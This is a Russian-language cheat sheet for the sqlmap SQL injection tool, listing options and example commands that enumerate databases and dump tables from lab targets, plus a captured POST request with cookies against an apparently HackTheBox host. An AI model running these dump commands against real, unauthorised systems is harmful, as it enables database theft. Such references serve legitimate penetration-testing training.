## SQLMAP
**Опции:**

- `-u --url http://www.hacktory.lab/` – URL цели;
- `--data` – указываем параметры для тестирования, передающиеся в POST-запросе (например, `data=&quot;txtLoginID=skan&amp;txtPassword=pass&amp;cmdSubmit=Login&quot;`);
- `--crawl` – сканирование сайта с целевого URL. С помощью этой опции можно выставить глубину, ниже которой sqlmap не будет сканировать (например, --crawl=3);
- `-f --forms` – парсинг и анализ форм на целевом URL;
- `-dbs` – ключ для перечисления имеющихся баз данных;
- `-D db\_name` – указываем конкретную базу данных (например -Ddvwa);
- `-T table\_name` – указываем конкретную таблицу (например, -Tusers);
- `--dump-all` – вытягиваем значения из всех перечисленных столбцов.


**Примеры использования:**

- `sqlmap --url http://www.hacktory.lab/?id=1` – сканировать параметр id в интерактивном режиме;
- `sqlmap --url http://www.hacktory.lab/?id=1 --batch` – сканировать параметр id автоматически;
- `sqlmap --url http://www.hacktory.lab/?id=1 --dbs` – получить список БД;
- `sqlmap --url http://www.hacktory.lab/?id=1 -D db --tables` – для БД db получить список таблиц;
- `sqlmap --url http://www.hacktory.lab/?id=1 -D db -T table --dump-all` – для БД db и таблицы table получить все данные.


**Другие примеры:**
```
sqlmap --help
sqlmap -u "<url>" --cookie="name=value"
```
Для более детального сканирование можно скопировать нужный пакет с запросом из burpsuite в файл request.txt и далее использовать сканирование:
```
sqlmap -r request.txt --level 5 --risk 3 -p email --batch
```
```
sqlmap -r request.txt --level 5 --risk 3 -p email --batch --dbs --threads 10 --hex 
```
```
sqlmap -r request.txt --level 5 --risk 3 -p email --batch -D <database> --tables --threads 10 --dump-all
```
```
sqlmap -r request.txt --level 5 --risk 3 -p email --batch -D <database> -T <table> -C <column>,<column2> --dump --threads 10
```
где request.txt:
```
POST /forget-password HTTP/1.1
Host: usage.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 60
Origin: http://usage.htb
Connection: close
Referer: http://usage.htb/forget-password
Cookie: XSRF-TOKEN=eyJpdiI6ImVKeENTWE5uTmk0WEtQT0crMXJpM0E9PSIsInZhbHVlIjoiblo4V0tBdGF1REIvOEpadnl3eFRyMWF5Z29LWG1vWGFMaTFBSm1rYnUzMng2MHl4enpWR1paQ2ljaWNZQlZvQ2d4Uy9NbTloVThwSkRQemZwZ2VFNkFBdk15ZkVEOHd0ZzhhTjZtTHhIYSt4aEwrbGRsS0xxSHpGb1I1blZDOGMiLCJtYWMiOiI5NTFmNDBiMzJhZjBkMzhkMjNmNzRkMmUxMTZkYjg5OTBmOWM2MzE3NzIxNzViNjhkMTk3ZWI4ODYxM2FlOGYwIiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6Im9wRVFkK0RRcFk4NlRpTmhUZys5dGc9PSIsInZhbHVlIjoiVUVwYXJtdWg5R3BZSWhEMHhnZDFOVTJZZkVzU3lPY1ViMUxtUWFKZUN5NFpNTHBmSGJRMjV5UDNOYm5IdXhqZGNnRDFicTBhekZYTnJrUXdTNWlWcEh2UVhPTmVlVmYwOXN6WlZzVGFkREZHWWlTOU91a3RNdEFUWGdLMFgwTGMiLCJtYWMiOiJiMzExMGE3ZDliYzczOWYxNzk2NGJiOTliZDQyYzdhZTQzMjBmZjZiZjZhY2QyYWE4YjkyNzg3MThiYTc5MTUzIiwidGFnIjoiIn0%3D
Upgrade-Insecure-Requests: 1

_token=NX6KOxDfLMuybJ3qXJh69reEQvm2aNkfNxeSui9U&email=qwelab
```